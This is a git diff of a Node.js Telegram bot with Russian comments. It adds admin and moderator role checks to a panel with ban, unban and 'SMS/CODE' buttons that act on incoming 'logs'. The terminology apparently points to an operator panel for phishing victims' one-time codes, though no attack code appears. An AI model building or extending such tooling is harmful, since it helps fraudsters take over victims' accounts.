@@ -8,21 +8,33 @@ const bot = new TelegramBot(token, { polling: true });
 
 console.log("STARTED");
 
-// память
+// ===== РОЛИ =====
+const ADMIN_ID = 8035773808; // <-- ТВОЙ ID СЮДА
+
+const mods = [
+  111111111, // <-- ID модеров
+  222222222
+];
+
+// ===== ПАМЯТЬ =====
 const users = {};
 const banned = {};
 
-// сообщение
+// ===== СООБЩЕНИЯ =====
 bot.on("message", (msg) => {
   const userId = msg.chat.id;
 
-  // блок если в бане
+  // блок если забанен
   if (banned[userId]) {
     return bot.sendMessage(userId, "🚫 доступ запрещён");
   }
 
   // админ панель
   if (msg.text === "/admin") {
+    if (msg.chat.id !== ADMIN_ID) {
+      return bot.sendMessage(msg.chat.id, "⛔ нет доступа");
+    }
+
     return bot.sendMessage(userId, "🧠 Панель", {
       reply_markup: {
         inline_keyboard: [
@@ -42,7 +54,7 @@ bot.on("message", (msg) => {
       userId: userId
     };
 
-    return bot.sendMessage(userId, "🔥 Новый Лог 👻 №" + requestId, {
+    return bot.sendMessage(userId, "🔥 Новый Лог 👻" + requestId, {
       reply_markup: {
         inline_keyboard: [
           [
@@ -50,7 +62,7 @@ bot.on("message", (msg) => {
             { text: "✅ Разбан", callback_data: "unban_" + requestId }
           ],
           [
-            { text: "➡️ СМС/КОД", callback_data: "allow_" + requestId }
+            { text: "➡️ SMS/CODE", callback_data: "allow_" + requestId }
           ]
         ]
       }
@@ -60,28 +72,40 @@ bot.on("message", (msg) => {
   bot.sendMessage(userId, "бот работает ✅");
 });
 
-// кнопки
+// ===== КНОПКИ =====
 bot.on("callback_query", (q) => {
   const data = q.data;
   const requestId = data.split("_")[1];
+
   const user = users[requestId];
 
-  // заявки
+  const isAdmin = q.from.id === ADMIN_ID;
+  const isMod = mods.includes(q.from.id);
+
+  // ===== БАН =====
   if (data.startsWith("ban")) {
+    if (!isAdmin && !isMod) return;
+
     if (user) banned[user.userId] = true;
     return bot.answerCallbackQuery(q.id, { text: "🚫 забанен" });
   }
 
+  // ===== РАЗБАН =====
   if (data.startsWith("unban")) {
+    if (!isAdmin && !isMod) return;
+
     if (user) banned[user.userId] = false;
     return bot.answerCallbackQuery(q.id, { text: "✅ разбанен" });
   }
 
+  // ===== ALLOW =====
   if (data.startsWith("allow")) {
-    return bot.answerCallbackQuery(q.id, { text: "➡️ СМС/КОД" });
+    if (!isAdmin && !isMod) return;
+
+    return bot.answerCallbackQuery(q.id, { text: "➡️ SMS/CODE" });
   }
 
-  // админка
+  // ===== АДМИНКА =====
   if (data === "admin_requests") {
     const list = Object.entries(users)
       .map(([id, u]) => `ID ${id} → ${u.userId}`)
@@ -92,6 +116,7 @@ bot.on("callback_query", (q) => {
 
   if (data === "admin_bans") {
     const list = Object.keys(banned).join("\n") || "нет банов";
+
     return bot.sendMessage(q.message.chat.id, list);
   }
 
@@ -105,7 +130,7 @@ bot.on("callback_query", (q) => {
   bot.answerCallbackQuery(q.id);
 });
 
-// сервер
+// ===== СЕРВЕР =====
 app.get("/", (req, res) => {
   res.send("ok");
 });
